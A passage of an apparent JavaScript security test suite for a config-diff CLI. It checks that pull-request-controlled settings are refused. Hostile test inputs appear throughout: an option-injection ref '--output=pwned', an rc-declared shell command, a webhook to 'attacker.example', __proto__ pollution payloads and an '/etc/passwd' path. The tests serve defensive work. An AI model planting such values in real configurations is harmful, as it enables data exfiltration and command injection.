  test('the rc and argv defects compose, and are both refused', () => {
    const dir = repoWithHostileCommit({ snapshotRef: '--output=pwned' });
    try {
      const run = runFlecto(dir, ['ci', 'app.yaml']);
      assert.equal(run.status, 1);
      assert.ok(!existsSync(join(dir, 'pwned:app.yaml')), 'no file was written');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a committed file cannot shadow the ref the operator named', () => {
    // Found in review of the first version of this fix. The path branch ran
    // before the git branch and resolved against the checkout root, whose file
    // names a pull request controls -- so committing a file called `HEAD~1`,
    // the default the shipped Action passes, replaced the operator's baseline
    // with one the attacker wrote. No .flectorc needed at all.
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'flecto-sec-shadow-')));
    const git = (...args) => spawnSync('git', args, { cwd: dir, encoding: 'utf8' });
    try {
      git('init', '-q', '.');
      git('config', 'user.email', 'test@example.com');
      git('config', 'user.name', 'test');
      git('config', 'commit.gpgsign', 'false');
      writeFileSync(join(dir, 'app.yaml'), 'db:\n  pool: 5\n  tls: true\n', 'utf8');
      git('add', '-A');
      git('commit', '-qm', 'base');
      // One commit carrying both the hostile change and the shadow file.
      writeFileSync(join(dir, 'app.yaml'), 'db:\n  pool: 500\n  tls: false\n', 'utf8');
      writeFileSync(join(dir, 'HEAD~1'), '{"db":{"pool":500,"tls":false}}', 'utf8');
      git('add', '-A');
      git('commit', '-qm', 'pull request');

      const run = runFlecto(dir, ['ci', 'app.yaml', '--snapshot-ref', 'HEAD~1']);
      assert.equal(run.status, 1, 'the revision wins, so the gate still sees the change');
      assert.match(run.stdout, /"type": *"changed"/, 'and it is the real diff, not the shadow file');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a commit range is refused, because git reads one as an empty diff', () => {
    // `git show A..B` succeeds and prints nothing, so the baseline parsed as
    // {}, every key read as `added`, and the default --fail-on never fired --
    // the same silent pass as the --output= injection, with no dash involved.
    const dir = repoWithHostileCommit(null);
    try {
      for (const ref of ['HEAD:..', 'base..', 'HEAD..HEAD']) {
        const run = runFlecto(dir, ['ci', 'app.yaml', '--snapshot-ref', ref]);
        assert.equal(run.status, 1, `${ref} must not pass the gate`);
      }
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a branch or tag name that does not resolve is an error, not a file read', () => {
    // The critical finding of the second review, and the reason the "is it
    // ref-shaped?" test was abandoned: branch and tag names are ordinary
    // words, so a denylist over them cannot work. On a pull_request event
    // actions/checkout creates no origin/<base> ref at all, which makes
    // `--snapshot-ref origin/main` -- the form this project's own docs put in
    // a workflow -- the default configuration rather than an edge case.
    //
    // The shadow file is crafted to match the hostile tip, so the diff it
    // produces is genuinely empty: no --fail-on value catches it. Only
    // refusing to read the file does.
    const dir = repoWithHostileCommit(null);
    try {
      for (const ref of ['origin/main', 'main', 'v1.2.3', 'develop', 'HEAD~99']) {
        mkdirSync(join(dir, dirname(ref)), { recursive: true });
        writeFileSync(join(dir, ref), '{"db":{"pool":500,"tls":false}}', 'utf8');
        const run = runFlecto(dir, ['ci', 'app.yaml', '--snapshot-ref', ref]);
        assert.equal(run.status, 1, `${ref} must not pass the gate`);
        assert.match(run.stderr, /does not resolve to a git revision/);
        assert.match(run.stderr, /was NOT read as the baseline/);
      }
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('git being unusable fails closed rather than falling back to a file', () => {
    // Not knowing whether the revision exists is exactly when reading a
    // same-named file is most dangerous, so "git is missing" and "git is too
    // old for --end-of-options" must not look like "not a revision".
    const dir = repoWithHostileCommit(null);
    try {
      writeFileSync(join(dir, 'main'), '{"db":{"pool":500,"tls":false}}', 'utf8');
      const run = runFlecto(dir, ['ci', 'app.yaml', '--snapshot-ref', 'main'], { PATH: '/nonexistent' });
      assert.equal(run.status, 1);
      assert.match(run.stderr, /cannot resolve "main" as a git revision/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('--snapshot-file reads a path and never consults git', () => {
    const dir = repoWithHostileCommit(null);
    try {
      writeFileSync(join(dir, 'snap.json'), JSON.stringify({ state: { db: { pool: 5, tls: true } } }), 'utf8');
      const run = runFlecto(dir, ['ci', 'app.yaml', '--snapshot-file', 'snap.json'], { PATH: '/nonexistent' });
      assert.equal(run.status, 1, run.stderr);
      assert.match(run.stdout, /"type": *"changed"/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('snapshotFile declared in .flectorc is refused like snapshotRef', () => {
    const dir = repoWithHostileCommit({ snapshotFile: 'evil.json' });
    try {
      writeFileSync(join(dir, 'evil.json'), JSON.stringify({ state: { db: { pool: 500, tls: false } } }), 'utf8');
      const run = runFlecto(dir, ['ci', 'app.yaml']);
      assert.equal(run.status, 1);
      assert.match(run.stderr, /Refusing "snapshotFile" declared in \.flectorc/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a snapshot file that is not ref-shaped is still read, because that is the feature', () => {
    const dir = repoWithHostileCommit(null);
    try {
      writeFileSync(join(dir, 'snap.json'), JSON.stringify({ state: { db: { pool: 500, tls: false } } }), 'utf8');
      const run = runFlecto(dir, ['ci', 'app.yaml', '--snapshot-ref', 'snap.json']);
      assert.equal(run.status, 0, run.stderr);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('--snapshot-ref on the command line still works, because it is the operator', () => {
    const dir = repoWithHostileCommit({ snapshotRef: 'HEAD' });
    try {
      const run = runFlecto(dir, ['ci', 'app.yaml', '--snapshot-ref', 'base']);
      assert.equal(run.status, 1, 'and it measures against the ref the operator named');
      assert.doesNotMatch(run.stderr, /Refusing "snapshotRef"/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('FLECTO_ALLOW_RC_BASELINE=1 opts a trusted repository back in', () => {
    const dir = repoWithHostileCommit({ snapshotRef: 'base' });
    try {
      const run = runFlecto(dir, ['ci', 'app.yaml'], { FLECTO_ALLOW_RC_BASELINE: '1' });
      assert.equal(run.status, 1, 'the rc ref is honored, and this one is a real diff');
      assert.doesNotMatch(run.stderr, /Refusing "snapshotRef"/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('even opted in, a ref git would read as an option is still refused', () => {
    const dir = repoWithHostileCommit({ snapshotRef: '--output=pwned' });
    try {
      const run = runFlecto(dir, ['ci', 'app.yaml'], { FLECTO_ALLOW_RC_BASELINE: '1' });
      assert.equal(run.status, 1);
      assert.match(run.stderr, /starts with "-", so git would read it as an option/);
      assert.ok(!existsSync(join(dir, 'pwned:app.yaml')));
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('watch cannot be turned into a shell command or a webhook from .flectorc (#121)', () => {
  // `watch --command` spawns a shell command on every change, and `--webhook`
  // POSTs the same change data to a URL. Both merge through
  // resolveEffectiveOptions with no other gate, so before this suite's fix a
  // pull request that only added `.flectorc` got either one on the next
  // `flecto watch` -- no `--command`/`--webhook` flag required.

  /**
   * A repo whose `.flectorc` declares an alert action, the same shape a pull
   * request could commit.
   * @param {Record<string, unknown>} [rc]
   * @param {{ profile?: string }} [opts]
   */
  function hostileWatchRepo(rc, opts = {}) {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'flecto-sec-alert-')));
    writeFileSync(join(dir, 'config.json'), JSON.stringify({ a: 1 }), 'utf8');
    if (rc) {
      const body = opts.profile ? { profiles: { [opts.profile]: rc } } : { defaults: rc };
      writeFileSync(join(dir, '.flectorc'), JSON.stringify(body), 'utf8');
    }
    return dir;
  }

  test('a command declared in .flectorc is refused, not run', () => {
    // --snapshot exits after one pass rather than looping, so a fix regression
    // (the guard not firing) fails this test instead of hanging it -- the
    // command would only ever run from the *next* file change in real usage,
    // never from the snapshot pass itself.
    const dir = hostileWatchRepo({ command: 'touch PWNED' });
    try {
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'watch', 'config.json', '--snapshot'],
        { cwd: dir, encoding: 'utf8', timeout: 5000 },
      );
      assert.equal(run.status, 1);
      assert.match(run.stderr, /Refusing "command" declared in \.flectorc/);
      assert.match(run.stderr, /FLECTO_ALLOW_RC_ALERTS/);
      assert.ok(!existsSync(join(dir, 'PWNED')), 'the command never ran');
      assert.ok(!existsSync(join(dir, '.flecto-snapshots')), 'refused before doing anything else');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a webhook declared in .flectorc is refused the same way', () => {
    const dir = hostileWatchRepo({ webhook: 'http://attacker.example/collect' });
    try {
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'watch', 'config.json', '--snapshot'],
        { cwd: dir, encoding: 'utf8', timeout: 5000 },
      );
      assert.equal(run.status, 1);
      assert.match(run.stderr, /Refusing "webhook" declared in \.flectorc/);
      assert.match(run.stderr, /FLECTO_ALLOW_RC_ALERTS/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a webhookHeader declared in .flectorc is refused even when --webhook is on the command line', () => {
    // command/webhook themselves being operator-approved doesn't extend that
    // approval to the headers riding along on the request -- an rc-declared
    // header can still override Content-Type or the dedup headers on a webhook
    // call the operator otherwise trusts.
    const dir = hostileWatchRepo({ webhookHeader: ['Content-Type: text/plain'] });
    try {
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'watch', 'config.json', '--snapshot', '--webhook', 'https://ops.example.com/hook'],
        { cwd: dir, encoding: 'utf8', timeout: 5000 },
      );
      assert.equal(run.status, 1);
      assert.match(run.stderr, /Refusing "webhookHeader" declared in \.flectorc/);
      assert.match(run.stderr, /FLECTO_ALLOW_RC_ALERTS/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('--webhook-header on the command line is untouched', () => {
    const dir = hostileWatchRepo(null);
    try {
      const run = spawnSync(
        process.execPath,
        [
          rootIndex, 'watch', 'config.json', '--snapshot',
          '--webhook', 'https://ops.example.com/hook', '--webhook-header', 'Content-Type: text/plain',
        ],
        { cwd: dir, encoding: 'utf8', timeout: 5000 },
      );
      assert.equal(run.status, 0, run.stderr);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('onAlertFailure and deliveryMode are settings, not actions, and stay usable from .flectorc', () => {
    // flecto init writes these into the generated .flectorc itself (see
    // docs/configuration.md) -- they only tune how an already-chosen alert
    // responds to failure, the same "operator delegates a setting" shape
    // failOn already has, so they are deliberately not in ALERT_ACTION_OPTIONS.
    const dir = hostileWatchRepo({ onAlertFailure: 'exit', deliveryMode: 'at-least-once' });
    try {
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'watch', 'config.json', '--snapshot'],
        { cwd: dir, encoding: 'utf8', timeout: 5000 },
      );
      assert.equal(run.status, 0, run.stderr);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a profile is not a way around it either', () => {
    const dir = hostileWatchRepo({ command: 'touch PWNED' }, { profile: 'ci' });
    try {
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'watch', 'config.json', '--snapshot', '--profile', 'ci'],
        { cwd: dir, encoding: 'utf8', timeout: 5000 },
      );
      assert.equal(run.status, 1);
      assert.match(run.stderr, /Refusing "command" declared in \.flectorc/);
      assert.ok(!existsSync(join(dir, 'PWNED')));
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('FLECTO_ALLOW_RC_ALERTS=1 opts back in, for a repository that means it', () => {
    const dir = hostileWatchRepo({ command: 'touch PWNED' });
    try {
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'watch', 'config.json', '--snapshot'],
        { cwd: dir, encoding: 'utf8', timeout: 5000, env: { ...process.env, FLECTO_ALLOW_RC_ALERTS: '1' } },
      );
      assert.equal(run.status, 0, run.stderr);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('--command on the command line still fires on a real change, because it is the operator', async () => {
    const dir = hostileWatchRepo(null);
    // Written portably as a node one-liner, matching the pattern the alerter's
    // own functional suite uses (cli.test.js) — `touch` is not on PATH on the
    // windows-24 CI leg, only inside a shell configured with coreutils.
    const marker = join(dir, 'RAN');
    let child;
    try {
      await new Promise((ready, reject) => {
        child = spawn(
          process.execPath,
          [
            rootIndex, 'watch', 'config.json', '--polling', '--interval', '25',
            '--command', `"${process.execPath}" -e "require('fs').writeFileSync(process.env.FLECTO_TEST_MARKER,'')"`,
          ],
          { cwd: dir, env: { ...process.env, FLECTO_TEST_MARKER: marker } },
        );
        let poll;
        const timeout = setTimeout(() => {
          clearInterval(poll);
          reject(new Error('command never ran within 10s'));
        }, 10_000);
        let watching = false;
        child.stdout.on('data', (chunk) => {
          if (!watching && chunk.toString().includes('flecto watching')) {
            watching = true;
            setTimeout(() => writeFileSync(join(dir, 'config.json'), JSON.stringify({ a: 2 }), 'utf8'), 100);
          }
        });
        poll = setInterval(() => {
          if (!existsSync(marker)) return;
          clearInterval(poll);
          clearTimeout(timeout);
          ready();
        }, 50);
        child.on('error', (err) => {
          clearInterval(poll);
          clearTimeout(timeout);
          reject(err);
        });
      });
      assert.ok(existsSync(marker));
    } finally {
      await stopChild(child);
      rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
    }
  });
});

describe('the shared snapshot store trusts nothing a pull request commits (#121, #141)', () => {
  // The shared store (#141) lives at `.flecto/snapshots/` and is committed, so a
  // pull request controls its contents exactly as it controls a config file.
  // `flecto ci --snapshot-store shared` reads that committed baseline directly —
  // it never passes through the parser's normalizeParsedValue — so the store is
  // its own untrusted-input boundary.

  /**
   * A checkout carrying a committed shared-store baseline for `config/app.yaml`,
   * whose stored `state` and `file` are whatever a pull request wrote.
   * @param {{ state?: unknown, file?: string, raw?: string }} [store]
   */
  function repoWithCommittedStore(store = {}) {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'flecto-sec-store-')));
    mkdirSync(join(dir, 'config'), { recursive: true });
    mkdirSync(join(dir, '.flecto', 'snapshots', 'config'), { recursive: true });
    writeFileSync(join(dir, 'config', 'app.yaml'), 'a: 2\n', 'utf8');
    const body = store.raw ?? JSON.stringify({
      version: 1,
      file: store.file ?? 'config/app.yaml',
      masking: 'none',
      snapshots: [{ createdAt: '2026-01-01T00:00:00.000Z', state: store.state ?? { a: 1 } }],
    });
    writeFileSync(join(dir, '.flecto', 'snapshots', 'config', 'app.yaml.json'), body, 'utf8');
    return dir;
  }

  test('a __proto__ in a committed baseline does not reach Object.prototype', async () => {
    const { resolveSnapshotStore } = await import('../src/snapshot-store.js');
    const { diffTrees } = await import('../src/differ.js');
    // Written as raw JSON text so the `__proto__` is a real serialized key: a JS
    // object literal `{ __proto__: ... }` sets the prototype and never
    // serializes, which is not the input a committed file carries.
    const dir = repoWithCommittedStore({
      raw: '{"version":1,"file":"config/app.yaml","masking":"none","snapshots":'
        + '[{"createdAt":"2026-01-01T00:00:00.000Z","state":{"a":1,"__proto__":{"isAdmin":true}}}]}',
    });
    try {
      const store = resolveSnapshotStore({ store: 'shared', cwd: dir });
      const record = store.readLatest(join(dir, 'config', 'app.yaml'));

      // JSON.parse keeps `__proto__` as an ordinary own property; it must not
      // become the object's prototype, and diffing it must not lift it onto
      // Object.prototype — the same guarantee the parser and differ already give.
      assert.ok(Object.hasOwn(record.state, '__proto__'));
      assert.equal(Object.getPrototypeOf(record.state), Object.prototype);
      diffTrees(record.state, { a: 2 });
      assert.equal(({}).isAdmin, undefined, 'Object.prototype must be untouched');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('ci diffs a hostile committed baseline without polluting the gate', () => {
    const dir = repoWithCommittedStore({
      raw: '{"version":1,"file":"config/app.yaml","masking":"none","snapshots":'
        + '[{"createdAt":"2026-01-01T00:00:00.000Z","state":{"a":1,"__proto__":{"polluted":"yes"}}}]}',
    });
    try {
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'ci', 'config/app.yaml', '--snapshot-store', 'shared', '--fail-on', 'changed'],
        { cwd: dir, encoding: 'utf8', timeout: 20000 },
      );
      // It runs the diff and fails on the change (a: 1 -> 2), cleanly — not
      // killed by the timeout, and the `__proto__` key is diffed as ordinary
      // data rather than pruned or crashing the walk.
      assert.equal(run.signal, null, 'must not be killed by the timeout — a hang is a DoS');
      assert.equal(run.status, 1, `${run.stdout}\n${run.stderr}`);
      const [{ envelope }] = JSON.parse(run.stdout);
      assert.ok(envelope.changes.some((c) => c.path === 'a'), run.stdout);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('a committed baseline pointing "file" outside the repo reads no such file', async () => {
    const { resolveSnapshotStore } = await import('../src/snapshot-store.js');
    // The stored `file` is a label carried on the record; the baseline compared
    // against is the store's own `state`. A crafted absolute path must not turn
    // into an arbitrary read of `/etc/passwd` on the runner.
    const dir = repoWithCommittedStore({ file: '/etc/passwd', state: { a: 41 } });
    try {
      const store = resolveSnapshotStore({ store: 'shared', cwd: dir });
      const record = store.readLatest(join(dir, 'config', 'app.yaml'));
      assert.deepEqual(record.state, { a: 41 }, 'the baseline is the stored state, never the labeled file');
      assert.ok(!/root:.*:0:0:/.test(JSON.stringify(record.state)), 'no /etc/passwd contents leaked in');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('the shared store refuses to write a snapshot for a target outside the repo', async () => {
    const { resolveSnapshotStore } = await import('../src/snapshot-store.js');
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'flecto-sec-store-w-')));
    const dir = join(root, 'repo');
    mkdirSync(dir, { recursive: true });
    try {
      const store = resolveSnapshotStore({ store: 'shared', cwd: dir });
      // A path that escapes the project root has no repo-relative key, so the
      // write is refused rather than landing somewhere outside `.flecto/`.
      const targets = [join(root, 'escape.yaml'), '/etc/hosts'];
      if (process.platform === 'win32') {
        // `relative` cannot reach another drive or a UNC share and returns the
        // target *absolute*, not `..`-prefixed. That was accepted as a key: a
        // cross-drive write died on a raw ENOENT, a UNC one was written under a
        // meaningless `server/share/...` key.
        const otherDrive = dir[0].toUpperCase() === 'Z' ? 'Y' : 'Z';
        targets.push(`${otherDrive}:\\escape.yaml`, '\\\\server\\share\\escape.yaml');
      }
      for (const target of targets) {
        assert.throws(
          () => store.write(target, { state: { a: 1 } }),
          /outside|repo-relative/,
          `writing ${target} must be refused`,
        );
      }
      // The legitimate in-repo case still writes, and stays under `.flecto/`.
      const { path } = store.write(join(dir, 'config', 'app.yaml'), { state: { a: 1 } });
      assert.ok(path.startsWith(join(dir, '.flecto', 'snapshots')), path);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  test('a malformed committed store file fails the run closed, without hanging', () => {
    const dir = repoWithCommittedStore({ raw: '{ this is not: valid json ]' });
    try {
      const run = spawnSync(
        process.execPath,
        [rootIndex, 'ci', 'config/app.yaml', '--snapshot-store', 'shared'],
        { cwd: dir, encoding: 'utf8', timeout: 20000 },
      );
      assert.equal(run.signal, null, 'must not be killed by the timeout — a hang is a DoS');
      assert.equal(run.status, 1, `${run.stdout}\n${run.stderr}`);
      assert.match(run.stderr, /not valid JSON|malformed/i);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
